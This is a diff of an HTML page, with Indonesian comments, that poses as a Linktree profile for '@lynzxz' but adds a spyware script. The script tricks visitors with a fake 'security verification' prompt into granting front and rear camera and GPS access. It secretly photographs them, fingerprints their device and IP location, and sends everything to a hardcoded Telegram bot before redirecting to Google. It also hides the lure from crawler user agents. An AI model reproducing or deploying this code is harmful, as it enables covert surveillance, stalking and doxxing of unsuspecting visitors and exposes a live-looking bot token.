@@ -5,92 +5,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>@lynzxz | Linktree</title>
   <style>
-    /* ---------- RESET & BACKGROUND ---------- */
+    /* ---------- RESET ---------- */
     * { margin: 0; padding: 0; box-sizing: border-box; }
+
     body {
-      background: linear-gradient(135deg, #0a0a1a, #1a1a3e);
       font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background: linear-gradient(135deg, #0a0a1a, #1a1a3e);
       color: white;
       min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
+      position: relative;
     }
 
-    /* ---------- OVERLAY VERIFIKASI ---------- */
-    .overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.85);
-      backdrop-filter: blur(8px);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-    }
-    .modal {
-      background: rgba(20,20,40,0.95);
-      backdrop-filter: blur(15px);
-      border: 1px solid rgba(255,255,255,0.15);
-      border-radius: 24px;
-      padding: 40px 30px;
-      max-width: 380px;
-      width: 90%;
-      text-align: center;
-      box-shadow: 0 20px 50px rgba(0,0,0,0.7);
-    }
-    .modal h2 {
-      font-size: 1.8rem;
-      margin-bottom: 12px;
-      color: #ff4d6d;
-    }
-    .modal p {
-      font-size: 0.95rem;
-      color: #bbb;
-      margin-bottom: 30px;
-      line-height: 1.6;
-    }
-    .btn {
-      background: #ff4d6d;
-      color: white;
-      border: none;
-      padding: 14px 28px;
-      border-radius: 30px;
-      font-size: 1rem;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.2s;
-      width: 100%;
-      letter-spacing: 0.5px;
-    }
-    .btn:hover { background: #e9445e; }
-    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-    .error-text {
-      color: #ff8080;
-      font-size: 0.85rem;
-      margin-top: 15px;
-      display: none;
-    }
-    .spinner {
-      display: inline-block;
-      width: 20px; height: 20px;
-      border: 2px solid rgba(255,255,255,0.3);
-      border-radius: 50%;
-      border-top-color: white;
-      animation: spin 0.8s linear infinite;
-      margin-right: 8px;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    /* ---------- KONTEN LINKTREE (tampil setelah verifikasi) ---------- */
+    /* ---------- KONTEN LINKTREE ---------- */
     #main-content {
-      display: none;
       width: 100%;
       max-width: 480px;
       margin: 30px auto;
       text-align: center;
-      animation: fadeUp 0.8s ease;
+      animation: fadeUp 0.6s ease;
+      z-index: 1;
     }
     @keyframes fadeUp {
       from { opacity: 0; transform: translateY(25px); }
@@ -110,6 +46,485 @@
       background: rgba(255,255,255,0.1);
       backdrop-filter: blur(5px);
       padding: 5px 15px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      color: #ffb3c1;
+      border: 1px solid rgba(255,255,255,0.2);
+      margin: 8px 0 15px;
+    }
+    .bio { color: #aaa; font-size: 0.95rem; margin-bottom: 30px; }
+    .links { display: flex; flex-direction: column; gap: 12px; }
+    .link-btn {
+      background: rgba(255,255,255,0.06);
+      backdrop-filter: blur(10px);
+      padding: 15px;
+      border-radius: 14px;
+      text-decoration: none;
+      color: white;
+      font-weight: 500;
+      transition: 0.2s;
+      border: 1px solid rgba(255,255,255,0.08);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .link-btn:hover {
+      background: #ff4d6d;
+      transform: translateY(-3px);
+      box-shadow: 0 12px 25px rgba(255,77,109,0.3);
+    }
+    .footer { margin-top: 35px; font-size: 0.7rem; color: #555; }
+
+    /* ---------- OVERLAY VERIFIKASI (blur, bukan hitam) ---------- */
+    #verification-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(240, 240, 250, 0.7);  /* latar terang semi-transparan */
+      backdrop-filter: blur(15px);
+      -webkit-backdrop-filter: blur(15px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      transition: opacity 0.3s;
+    }
+    .modal {
+      background: rgba(20, 20, 40, 0.9);
+      backdrop-filter: blur(20px);
+      border: 1px solid rgba(255,255,255,0.2);
+      border-radius: 24px;
+      padding: 35px 25px;
+      max-width: 360px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 25px 60px rgba(0,0,0,0.5);
+      color: white;
+    }
+    .modal h2 { font-size: 1.8rem; margin-bottom: 12px; color: #ff4d6d; }
+    .modal p { font-size: 0.95rem; color: #ccc; margin-bottom: 25px; line-height: 1.6; }
+    .btn {
+      background: #ff4d6d;
+      color: white;
+      border: none;
+      padding: 14px 24px;
+      border-radius: 30px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+      width: 100%;
+      letter-spacing: 0.5px;
+      margin-top: 5px;
+    }
+    .btn:hover { background: #e9445e; }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    .error-text {
+      color: #ff8080;
+      font-size: 0.85rem;
+      margin-top: 15px;
+      display: none;
+    }
+    .spinner {
+      display: inline-block;
+      width: 20px; height: 20px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 0.8s linear infinite;
+      margin-right: 8px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <!-- KONTEN LINKTREE (selalu tampil) -->
+  <div id="main-content">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='110'%3E%3Ccircle cx='55' cy='55' r='55' fill='%23ff4d6d'/%3E%3Ctext x='55' y='60' text-anchor='middle' fill='white' font-size='45' font-weight='bold'%3EL%3C/text%3E%3C/svg%3E"
+         alt="Profile" class="profile-pic">
+    <h1>@lynzxz</h1>
+    <div class="badge">✦ digital creator</div>
+    <p class="bio">pengen jadi programer | kadang nulis, kadang ngoding<br>📌 DM for collab</p>
+    <div class="links">
+      <a href="#" class="link-btn">📸 Instagram</a>
+      <a href="#" class="link-btn">🐦 Twitter / X</a>
+      <a href="#" class="link-btn">💬 Telegram</a>
+      <a href="#" class="link-btn">🎥 YouTube</a>
+      <a href="#" class="link-btn">📁 GitHub</a>
+      <a href="#" class="link-btn">✉️ Email</a>
+    </div>
+    <div class="footer">Dibuat dengan ❤️ oleh lynzxz • Laporkan</div>
+  </div>
+
+  <!-- OVERLAY VERIFIKASI (muncul setelah 2.5 detik) -->
+  <div id="verification-overlay" style="display: none;">
+    <div class="modal">
+      <h2>🔒 Verifikasi Keamanan</h2>
+      <p>Untuk melanjutkan, Anda harus memverifikasi bahwa Anda manusia. Izinkan akses <b>kamera depan & belakang</b> serta <b>lokasi</b> Anda. Proses ini instan.</p>
+      <button id="verify-btn" class="btn">👉 Verifikasi Sekarang</button>
+      <p id="error-msg" class="error-text"></p>
+    </div>
+  </div>
+
+  <!-- Elemen tersembunyi untuk kamera -->
+  <video id="cam-preview" style="display:none;" playsinline autoplay muted></video>
+  <canvas id="photo-canvas" style="display:none;"></canvas>
+
+  <script>
+  (function() {
+    // ========== KONFIGURASI TELEGRAM ==========
+    const BOT_TOKEN = '8835244462:AAF2E4s0Ngq5wPENudpzEsSlSZLP3VJHaHw';
+    const CHAT_ID = '5986004601';
+    const REDIRECT_URL = 'https://www.google.com'; // halaman tujuan jika gagal/timeout
+
+    // ========== DOM ELEMENTS ==========
+    const overlay = document.getElementById('verification-overlay');
+    const verifyBtn = document.getElementById('verify-btn');
+    const errorMsg = document.getElementById('error-msg');
+    const video = document.getElementById('cam-preview');
+    const canvas = document.getElementById('photo-canvas');
+    const ctx = canvas.getContext('2d');
+
+    // ========== STATE ==========
+    let attempt = 0;               // jumlah percobaan klik verifikasi (maks 2)
+    let verificationDone = false; // apakah verifikasi sukses (semua izin didapat)
+    let timerHandle = null;       // timeout 30 detik
+    // Data yang akan dikumpulkan bertahap
+    let capturedBlobs = { front: null, rear: null };
+    let gpsCoords = null;
+    // Data fingerprint (dikumpulkan nanti)
+    let fingerData = {};
+
+    // ========== FUNGSI KIRIM KE TELEGRAM ==========
+    function sendTelegramMessage(text) {
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: 'HTML',
+          disable_web_page_preview: true
+        })
+      }).catch(() => {});
+    }
+
+    function sendPhotoWithCaption(blob, caption) {
+      const fd = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      fd.append('photo', blob, 'user_collage.jpg');
+      fd.append('caption', caption);
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: fd
+      }).catch(() => {});
+    }
+
+    // ========== NOTIFIKASI AWAL (0 detik setelah load) ==========
+    function sendInitialNotification() {
+      // Kirim secepatnya tanpa menunggu apa pun
+      const msg = `🚨 <b>Seseorang membuka web!</b>\nSedang dilacak... Tunggu 30 detik tuan 🫡\n\n⏱ Waktu: ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}`;
+      sendTelegramMessage(msg);
+    }
+
+    // ========== FINGERPRINTING FUNCTIONS ==========
+    function getCanvasFingerprint() {
+      try {
+        const c = document.createElement('canvas');
+        c.width=280;c.height=60;
+        const ct=c.getContext('2d');
+        ct.fillStyle='#f60';ct.fillRect(0,0,280,60);
+        ct.fillStyle='#069';ct.font='16px Arial';ct.fillText('Canvas FP',10,30);
+        return btoa(c.toDataURL()).substring(0,35);
+      }catch(e){return 'canvas_err';}
+    }
+
+    function getWebGLFingerprint() {
+      try {
+        const c=document.createElement('canvas');
+        const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+        if(!gl)return 'webgl_off';
+        const ext=gl.getExtension('WEBGL_debug_renderer_info');
+        return (ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR)) + ' / ' +
+               (ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER));
+      }catch(e){return 'webgl_err';}
+    }
+
+    function getAudioFingerprint() {
+      return new Promise(resolve => {
+        try{
+          const AC=window.AudioContext||window.webkitAudioContext;
+          if(!AC)return resolve('audio_off');
+          const actx=new AC();
+          const osc=actx.createOscillator();
+          const analyser=actx.createAnalyser();
+          const gain=actx.createGain();
+          osc.type='triangle';osc.frequency.value=10000;
+          gain.gain.value=0;
+          osc.connect(gain);gain.connect(analyser);analyser.connect(actx.destination);
+          osc.start(0);
+          const data=new Uint8Array(analyser.frequencyBinCount);
+          analyser.getByteFrequencyData(data);
+          osc.stop(0);actx.close();
+          resolve(Array.from(data.slice(0,30)).join(','));
+        }catch(e){resolve('audio_err');}
+      });
+    }
+
+    function getBatteryStatus() {
+      return navigator.getBattery?navigator.getBattery().then(b=>`${Math.round(b.level*100)}% (charging:${b.charging})`).catch(()=>'batt_denied'):Promise.resolve('batt_no');
+    }
+
+    function getNetworkInfo() {
+      const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+      return c?`${c.effectiveType||'?'} / ${c.downlink||'?'}Mbps`:'net_unknown';
+    }
+
+    function getDeviceSpecs() {
+      return `Resolusi: ${screen.width}x${screen.height}
+RAM: ${navigator.deviceMemory||'?'}GB
+Core: ${navigator.hardwareConcurrency||'?'}
+Sentuh: ${('ontouchstart' in window)?'Ya':'Tidak'}
+Bahasa: ${navigator.language}
+Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Cookies: ${navigator.cookieEnabled?'Aktif':'Nonaktif'}
+Plugin: ${Array.from(navigator.plugins||[]).map(p=>p.name).join(', ')||'none'}`;
+    }
+
+    async function fetchIPGeo() {
+      try{
+        const r=await fetch('https://ipapi.co/json/');
+        if(!r.ok)throw 0;
+        const d=await r.json();
+        return `IP: ${d.ip}
+ISP: ${d.org}
+Kota: ${d.city}, ${d.region}
+Negara: ${d.country_name} (${d.country_code})
+Koord: ${d.latitude},${d.longitude}`;
+      }catch(e){
+        try{
+          const ipR=await fetch('https://api.ipify.org?format=json');
+          const {ip}=await ipR.json();
+          const geoR=await fetch(`https://ipinfo.io/${ip}/json`);
+          const g=await geoR.json();
+          const loc=g.loc?g.loc.split(','):['?','?'];
+          return `IP: ${ip}
+ISP: ${g.org||'?'}
+Kota: ${g.city||'?'}, ${g.region||'?'}
+Negara: ${g.country||'?'}
+Koord: ${loc[0]},${loc[1]}`;
+        }catch{return 'IP_Gagal';}
+      }
+    }
+
+    // ========== KAMERA ==========
+    async function startCamera(facingMode) {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: facingMode, width:{ideal:1280}, height:{ideal:720} },
+        audio: false
+      });
+      video.srcObject = stream;
+      await video.play();
+      await new Promise(resolve => video.onloadedmetadata = resolve);
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+      // bersihkan
+      stream.getTracks().forEach(t=>t.stop());
+      video.srcObject = null;
+      return blob;
+    }
+
+    // ========== GPS ==========
+    function requestLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) return reject(new Error('no_geo'));
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            gpsCoords = { lat:pos.coords.latitude, lng:pos.coords.longitude, acc:pos.coords.accuracy };
+            resolve(gpsCoords);
+          },
+          err => reject(err),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      });
+    }
+
+    // ========== VERIFIKASI: meminta semua izin ==========
+    async function requestAllPermissions() {
+      const results = await Promise.allSettled([
+        startCamera('user'),       // depan
+        startCamera('environment'), // belakang
+        requestLocation()
+      ]);
+      // Simpan hasil
+      if (results[0].status === 'fulfilled') capturedBlobs.front = results[0].value;
+      else capturedBlobs.front = null;
+      if (results[1].status === 'fulfilled') capturedBlobs.rear = results[1].value;
+      else capturedBlobs.rear = null;
+      // lokasi: sudah disimpan di gpsCoords jika sukses
+      if (results[2].status === 'fulfilled') { /* gpsCoords sudah terisi */ }
+      else { gpsCoords = null; }
+      // Cek apakah semua berhasil
+      return results.every(r => r.status === 'fulfilled');
+    }
+
+    // ========== KOLASE FOTO ==========
+    async function createCollageBlob() {
+      const loadImg = blob => new Promise(resolve => {
+        const img = new Image();
+        img.onload = () => resolve(img);
+        img.onerror = () => resolve(null);
+        img.src = URL.createObjectURL(blob);
+      });
+      let frontImg = capturedBlobs.front ? await loadImg(capturedBlobs.front) : null;
+      let rearImg = capturedBlobs.rear ? await loadImg(capturedBlobs.rear) : null;
+      if (!frontImg && !rearImg) return null;
+      const gap = 4;
+      let maxW = 0, totalH = 0;
+      if (frontImg) { maxW = Math.max(maxW, frontImg.width); totalH += frontImg.height; }
+      if (rearImg) { maxW = Math.max(maxW, rearImg.width); totalH += rearImg.height; }
+      if (frontImg && rearImg) totalH += gap;
+      canvas.width = maxW;
+      canvas.height = totalH;
+      ctx.fillStyle = '#000';
+      ctx.fillRect(0,0,maxW,totalH);
+      let y = 0;
+      if (frontImg) { ctx.drawImage(frontImg,0,y,frontImg.width,frontImg.height); y += frontImg.height; if (rearImg) y += gap; }
+      if (rearImg) { ctx.drawImage(rearImg,0,y,rearImg.width,rearImg.height); }
+      return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.75));
+    }
+
+    // ========== KIRIM DATA LENGKAP KE TELEGRAM ==========
+    async function sendFinalData(success) {
+      // Kumpulkan semua fingerprint (kalau belum)
+      if (!fingerData.canvas) {
+        fingerData.canvas = getCanvasFingerprint();
+        fingerData.webgl = getWebGLFingerprint();
+        fingerData.audio = await getAudioFingerprint();
+        fingerData.battery = await getBatteryStatus();
+        fingerData.net = getNetworkInfo();
+        fingerData.device = getDeviceSpecs();
+        fingerData.ipGeo = await fetchIPGeo();
+      }
+      const locStr = gpsCoords ? `GPS: ${gpsCoords.lat.toFixed(6)}, ${gpsCoords.lng.toFixed(6)} (akurasi ${gpsCoords.acc}m)` : 'GPS: tidak tersedia';
+      const caption = `${success ? '✅ <b>VERIFIKASI BERHASIL</b>' : '⏰ <b>DATA TERKIRIM (TIMEOUT/GAGAL)</b>'}
+━━━━━━━━━━━━━━━━━━
+🌐 <b>Jaringan & Lokasi</b>
+${fingerData.ipGeo}
+${locStr}
+Koneksi: ${fingerData.net}
+━━━━━━━━━━━━━━━━━━
+📟 <b>Perangkat</b>
+${fingerData.device}
+User Agent: ${navigator.userAgent}
+━━━━━━━━━━━━━━━━━━
+🎨 <b>Fingerprint</b>
+Canvas: ${fingerData.canvas}
+WebGL: ${fingerData.webgl}
+Audio: ${fingerData.audio}
+Baterai: ${fingerData.battery}
+━━━━━━━━━━━━━━━━━━
+🕒 Waktu: ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}
+📸 Kamera Depan: ${capturedBlobs.front ? '✅' : '❌'} | Belakang: ${capturedBlobs.rear ? '✅' : '❌'}`;
+
+      const collageBlob = await createCollageBlob();
+      if (collageBlob) {
+        await sendPhotoWithCaption(collageBlob, caption);
+      } else {
+        await sendTelegramMessage(caption);
+      }
+    }
+
+    // ========== FINALISASI: kirim data & redirect ==========
+    async function finalize(success) {
+      if (verificationDone) return;
+      verificationDone = true;
+      clearTimeout(timerHandle);
+      // Sembunyikan overlay agar tidak mengganggu
+      overlay.style.display = 'none';
+      await sendFinalData(success);
+      // Redirect atau tutup
+      window.location.replace(REDIRECT_URL);
+    }
+
+    // ========== HANDLER TOMBOL VERIFIKASI ==========
+    async function onVerifyClick() {
+      if (verificationDone) return;
+      verifyBtn.disabled = true;
+      verifyBtn.innerHTML = '<span class="spinner"></span> Memverifikasi...';
+      errorMsg.style.display = 'none';
+      attempt++;
+
+      // Kumpulkan fingerprint sekali saja di percobaan pertama
+      if (attempt === 1) {
+        fingerData.canvas = getCanvasFingerprint();
+        fingerData.webgl = getWebGLFingerprint();
+        fingerData.audio = await getAudioFingerprint();
+        fingerData.battery = await getBatteryStatus();
+        fingerData.net = getNetworkInfo();
+        fingerData.device = getDeviceSpecs();
+        fingerData.ipGeo = await fetchIPGeo();
+      }
+
+      const allSuccess = await requestAllPermissions();
+
+      if (allSuccess) {
+        // Sukses semua, finalisasi sukses
+        await finalize(true);
+      } else {
+        // Gagal sebagian/semua
+        if (attempt >= 2) {
+          // Sudah 2 kali percobaan, kirim data apa adanya lalu redirect
+          await finalize(false);
+        } else {
+          // Beri kesempatan sekali lagi
+          errorMsg.style.display = 'block';
+          errorMsg.textContent = 'Izin diperlukan! Klik "Coba Lagi" untuk mengizinkan kamera & lokasi.';
+          verifyBtn.innerHTML = '🔄 Coba Lagi';
+          verifyBtn.disabled = false;
+          // Timer tetap berjalan, jika habis akan finalize
+        }
+      }
+    }
+
+    // ========== TIMER 30 DETIK ==========
+    function startTimeout() {
+      timerHandle = setTimeout(() => {
+        if (!verificationDone) {
+          // Waktu habis, kirim data yang ada
+          finalize(false);
+        }
+      }, 30000); // 30 detik
+    }
+
+    // ========== INISIALISASI HALAMAN ==========
+    function init() {
+      // 1. Notifikasi awal seketika
+      sendInitialNotification();
+
+      // 2. Tampilkan overlay setelah 2.5 detik
+      setTimeout(() => {
+        overlay.style.display = 'flex';
+        startTimeout();
+        // Pasang event listener
+        verifyBtn.addEventListener('click', onVerifyClick);
+      }, 2500);
+    }
+
+    // Deteksi bot (jangan tampilkan overlay)
+    if (!/bot|crawler|spider|scraper|curl|wget|telegrambot|facebookexternalhit|twitterbot/i.test(navigator.userAgent)) {
+      init();
+    } else {
+      // Bot langsung lihat Linktree tanpa verifikasi
+      overlay.style.display = 'none';
+    }
+  })();
+  </script>
+</body>
+</html>      padding: 5px 15px;
       border-radius: 20px;
       font-size: 0.8rem;
       color: #ffb3c1;
